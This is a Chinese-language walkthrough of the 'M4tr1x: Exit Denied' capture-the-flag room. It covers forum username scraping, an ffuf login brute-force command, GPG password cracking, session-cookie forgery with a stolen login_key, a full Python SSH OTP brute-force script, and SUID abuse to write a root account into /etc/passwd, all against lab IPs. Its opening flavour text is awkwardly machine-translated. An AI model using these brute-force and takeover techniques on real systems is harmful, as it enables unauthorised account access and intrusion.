# M4tr1x: Exit Denied

大多数人只看到一个完美构建的系统。但你一直都是不同的。你不仅看到表面上的东西，还看到 它下面有什么统治;调节和调节的内部关联机制 几乎完美地管理其每个模块，以至于它试图隐藏所有模块 其多面设计中的微小孔。但是，这些漏洞仍然存在，不要 他们？。。。是的，你还在学习，但你最大的弱点是自我怀疑......它继续 阻止你...你知道它来自哪里吗？在内心深处，我知道你会这样做。 你知道有些事情不对劲，你只是不能把手指放在上面。井 让我告诉你。你生活在梦中。一个已经放在你的 眼睛让你看不到你意识到你可以成为谁。是的。。。我能感觉到你 知道我告诉你的是真的...困境是有这些“代理人”...... 让我们称它们为看起来像你和我的程序。他们试图传播这一点 自我怀疑、怀疑和恐惧的病毒进入少数人的潜意识 具有巨大潜力的新兴黑客。你为什么问？这是因为头脑 像你一样对控制“M4tr1x 系统”的人构成威胁;人造的， 模拟世界是为了抑制你的全部感官而开发的。在下一场反对机器的战争中，我们需要你。但只有你能逃脱 将您的工程现实带入现实世界...我 将在另一边等待。

---

## 端口扫描

循例nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/52b1fe1d47ee4eb0a3d648af2912b1e0.png)

## Web枚举

进入80

![在这里插入图片描述](https://img-blog.csdnimg.cn/44b3a50ea49846bc8a0c98d8203b75fe.png)

gobuster扫

![在这里插入图片描述](https://img-blog.csdnimg.cn/c9bd6c4abe604b0b9b5fd88f749a64b9.png)

似乎都没啥东西

在memberlist下发现题目描述的兔子

![在这里插入图片描述](https://img-blog.csdnimg.cn/f999174c427740e9887f22ad3549a309.png)

它有一些帖子，进去看一眼

![在这里插入图片描述](https://img-blog.csdnimg.cn/5c7433a1c0ca4f46aa22cb8a0f157ca5.png)

先注册个账号

![在这里插入图片描述](https://img-blog.csdnimg.cn/f2a75bcf0fba46ef8bbd5a2ab6813546.png)

有个漏洞赏金的帖子

![在这里插入图片描述](https://img-blog.csdnimg.cn/fd89347a59984849b0e899436d4de11e.png)

	我们致力于保护我们的社区免受未来的网络攻击。
	
	如果您是一名安全专家或积极参与查找 Web 应用程序中的安全漏洞的爱好者，那么 linux-bay 需要您。 要参与，您需要做的就是确保向以下页面报告任何小弱点：/bugbountyHQ，我们将尝试解决上述问题。 请注意：如果安全漏洞被认为是严重的，那么请 PM 我或任何模组，不要使用上面的报告页面。 谢谢
	
	
	
	更新：由于维护而禁用。

进到那个可能存在漏洞的页面

![在这里插入图片描述](https://img-blog.csdnimg.cn/653388608df043bfbdacf537e9bf433d.png)

虽然它禁用了，但是我们仍然可以通过修改前端，删除disable属性来启用它

![在这里插入图片描述](https://img-blog.csdnimg.cn/3e88ce63b4724fc287d922a0824ee65a.png)

在reportPanel.php，披露了他人提交的漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/1c146ed32f894338b582474aab318d8a.png)

挑选最新的一些漏洞，有这三个

![在这里插入图片描述](https://img-blog.csdnimg.cn/6796d836742a4f7d91e8dad95fa7c54b.png)

弱密码应该是我们不错的选择

我们先使用python写个爬虫

```python
from lxml import etree
import requests


for index in range(1,4):
	req_uri = f'http://10.10.102.167/memberlist.php?sort=regdate&order=ascending&perpage=20&page={index}'
	res = requests.get(req_uri)
	
	nameList = (etree.HTML(res.text)).xpath('//td/a/text()')
	nameList1 = (etree.HTML(res.text)).xpath('//td/a/span/strong/text()')
	for name in nameList:
		print(name)
	for name1 in nameList1:
		print(name1)
```

运行脚本，使用管道符写入文件，我们得到了比较完整的用户名

![在这里插入图片描述](https://img-blog.csdnimg.cn/91ff74e0a3cc49ad9188abc432930ae4.png)

把那些弱密码也保存下来

ffuf爆破

```bash
ffuf -u 'http://10.10.102.167/member.php' -X POST -H 'Cookie: mybb[lastvisit]=1682388755; mybb[lastactive]=1682393195; _ga=GA1.1.858611810.1682392067; _gid=GA1.1.181915025.1682392067; _gat_gtag_UA_120533740_1=1; sid=6e99b20229c6b51e87f4c8e841ff7ebd' -H 'Content-Type:application/x-www-form-urlencoded' -d 'username=USER&password=PASS&remember=yes&submit=Login&action=do_login&url=&my_post_key=68261ebeaf58eb3ba4c7f71b193eb4db' -w ./users.txt:USER -w ./pass.txt:PASS -fw 666
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/a8e69e92b3144968a9e348a76b623a0a.png)

获得不少账户的密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/e7b6eb0cd1654350907a534adc8e709c.png)

其中有两个账户PalacerKing和ArnoldBagger是版主

登录PalacerKing，查看信箱

![在这里插入图片描述](https://img-blog.csdnimg.cn/efee875dd6734579a90f0d4df28080b0.png)

登另一个账号，把信箱翻个遍，发现一个目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/7a1a10273bcb421f82a5189a13ab04a1.png)

有个插件和gpg

![在这里插入图片描述](https://img-blog.csdnimg.cn/82b2e13620b64230a2d5895a0349ce9a.png)

在v2版本的插件代码当中，最有价值的信息就是：

```php
$sql_p = file_get_contents('inc/tools/manage/SQL/p.txt'); //read SQL password from p.txt
```

那么很显然，p.txt.gpg文件中就存放了密码

根据房间的指引，在reportPanel.php的源代码下发现了

![在这里插入图片描述](https://img-blog.csdnimg.cn/c355bd0b2627439c8247b066db494648.png)

cyberchef解码

![在这里插入图片描述](https://img-blog.csdnimg.cn/1846f94be1974716bc2cd771e05e4d34.png)

把它拆开翻译一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/24aeac12af9a4f9eb12b35a5c71b4050.png)

进到那个二进制的目录

查看源代码，发现与上文提供的信息有关的地方这些中文里参杂了一些英文字母：ofqxvg

![在这里插入图片描述](https://img-blog.csdnimg.cn/90af3f871b4240b08292ba672efa0c7b.png)

而题目引导我们去利用几个英文字母去生成密码来破解gpg文件

直接贴代码

```python
import itertools


str1 = 'ofqxvg'
p = itertools.permutations(str1)

for pass_list in list(p):
	pwd = ''
	for val in pass_list:
		pwd += val
	print(pwd)
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/777453bf13eb4dbebf320935b82c2e1b.png)

gpg2john+john直接爆

![在这里插入图片描述](https://img-blog.csdnimg.cn/606ac4c90eb74518a910397049410f16.png)

gpg解密得到数据库的密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/6b0c6994eb1c43eeb94bc235bfb6af86.png)

插件中是使用mod登录数据库

```php
//!!!!!!SQL LOGIN for modManager (needed for reading login_keys for user migration)
define('localhost', 'localhost:3306');
//mysql connect using user 'mod' and password from 'sql_p varirable'
$db = mysql_connect('localhost','mod',$sql_p);
```

直接登mysql

在里面找到了另一个我们之前没有密码的版主的login_key

![在这里插入图片描述](https://img-blog.csdnimg.cn/a52b4b3f1e2a42e38d8e75a6f3dd43b2.png)

使用cookie editor找到了使用login_key的位置，uid+login_key

![在这里插入图片描述](https://img-blog.csdnimg.cn/cc1ca0d0c31f4e9383829437700e35f2.png)

直接改成blackcat的uid和login_key

![在这里插入图片描述](https://img-blog.csdnimg.cn/a77cac81261941d2a13571e873442a6e.png)

在里面找到一些文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/16cb4719607c4fbba97a159efb6ba4a0.png)

找到了房间所说的文档，看的有点晕，来一颗wp救心丹[@siunam321](https://siunam321.github.io/ctf/tryhackme/M4tr1x-Exit-Denied/)

```python
from datetime import datetime, timedelta
from hashlib import sha256
import random
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import os
import ntplib

class TimeSimulatorClient:
    def __init__(self, sharedSecret1, sharedSecret2, sharedSecret3, targetIPAdress):
        self.sharedSecret1 = sharedSecret1
        self.sharedSecret2 = sharedSecret2
        self.sharedSecret3 = sharedSecret3
        self.targetIPAdress = targetIPAdress
        self.listSecret = [sharedSecret1, sharedSecret2, sharedSecret3]

    def setTimeZone(self):
        try:
            print('[*] Setting timezone to UTC')
            print('[*] Before:')
            os.system('sudo timedatectl --value')
            os.system('sudo timedatectl set-timezone UTC')
            print('[+] Timezone has been changed to UTC')
        except:
            print('[-] Couldn\'t set the timezone to UTC')

    def syncTime(self):
        try: 
            client = ntplib.NTPClient()
            client.request(self.targetIPAdress) #IP of linux-bay server
            print('[+] Synced to the time server')
        except:
            print('[-] Could not sync with time server')

    def TimeSet(self, country, hours, mins, seconds):
        now = datetime.now() + timedelta(hours=hours, minutes=mins)
        #time units: day, hour, minutes
        CurrentTime = int(now.strftime("%d%H%M"))

        return CurrentTime
       
    def getOTP(self):
        CA = self.TimeSet('Ukraine', 4, 43, 0)
        CB = self.TimeSet('Germany', 13, 55, 0)
        CC = self.TimeSet('England', 9, 19, 0)
        CD = self.TimeSet('Nigeria', 1, 6, 0)
        CE = self.TimeSet('Denmark', -5, 18, 0)

        listTimeSet = [CA, CB, CC, CD, CE]
        randomTimeSet = random.sample(listTimeSet, 3)

        # CTT = CA * CB * CC
        CTT = randomTimeSet[0] * randomTimeSet[1] * randomTimeSet[2]

        # UC = CTT XOR SST
        UC = CTT ^ random.choice(self.listSecret)

        # hash OTP
        HC = (sha256(repr(UC).encode('utf-8')).hexdigest())

        # HC Truncate
        T = HC[22:44]
        
        SSHOTP = T
        return SSHOTP

    def bruteForceSSH(self, SSHUsername, OTP):
        print(f'[*] Trying SSH OTP: {OTP}', end='\r')

        sshClient = SSHClient()
        sshClient.set_missing_host_key_policy(AutoAddPolicy())
        try:
            sshClient.connect(self.targetIPAdress, username=SSHUsername, password=OTP, banner_timeout=300)
            return True
        except AuthenticationException:
            # print(f'[-] Wrong OTP: {OTP}')
            pass
        except ssh_exception.SSHException:
            print('[*] Attempting to connect - Rate limiting on server')

def main():
    #shared secret token for OTP calculation
    sharedSecret1 = 1289xxxxxxxx488
    sharedSecret2 = 59xxxxxxxx453
    sharedSecret3 = 79xxxxxxx579
    # Change to the machine's IP
    targetIPAdress = '10.10.96.40'
    
    timeSimulatorClient = TimeSimulatorClient(sharedSecret1, sharedSecret2, sharedSecret3, targetIPAdress)

    # Change timezone & sync to the time server
    timeSimulatorClient.setTimeZone()
    timeSimulatorClient.syncTime()

    # Brute forcing SSH with computed OTP
    SSHUsername = 'architect'
    while True:
        OTP = timeSimulatorClient.getOTP()
        bruteForceResult = timeSimulatorClient.bruteForceSSH(SSHUsername, OTP)

        if bruteForceResult is True:
            print(f'[+] Found the correct OTP! {SSHUsername}:{OTP}')
            break

if __name__ == '__main__':
    main()
```

跑出来

![在这里插入图片描述](https://img-blog.csdnimg.cn/5bf0317e57024861adefe19803c982c7.png)

登ssh同时拿到user flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/c396442de4e04967a26e23f1c6543d9e.png)

## 权限提升

find suid，发现一个陌生的二进制文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/96a34f0860624e0f8f536b04edd5cd61.png)

根据lol，它可以造成任意文件读写

![在这里插入图片描述](https://img-blog.csdnimg.cn/0f93059b90584643b4a68f302d03cad5.png)

直接利用其向passwd写入账户，值得注意的是要将hash开头的两个$前加反斜杠

![在这里插入图片描述](https://img-blog.csdnimg.cn/59a052eb8c324b65b5ce9831ef653586.png)

但root flag不在root家目录下

find找到了'/etc/-- -root.py'

![在这里插入图片描述](https://img-blog.csdnimg.cn/b7ec208eebe047b9b2bd9614156325fa.png)

直接运行它得到flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/0ae8bfd27fa84b6a9e402d574fb8b0c0.png)

题目还要找acp pin

![在这里插入图片描述](https://img-blog.csdnimg.cn/ceebfd41bedd4496a67cf5785fb5c60a.png)

python计算一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/be64351c7d904bdeb9cfa5c99d21e80c.png)

得到pin码后，拿着bigpaul的凭据回去登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/281c9784eb3f47c3be32fd568196a7ab.png)

直接登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/94b54dbcf0304761b31746b211af1314.png)

web flag在下面的note

![在这里插入图片描述](https://img-blog.csdnimg.cn/faf91b033dc4423fbd6fab0d66eb92c7.png)
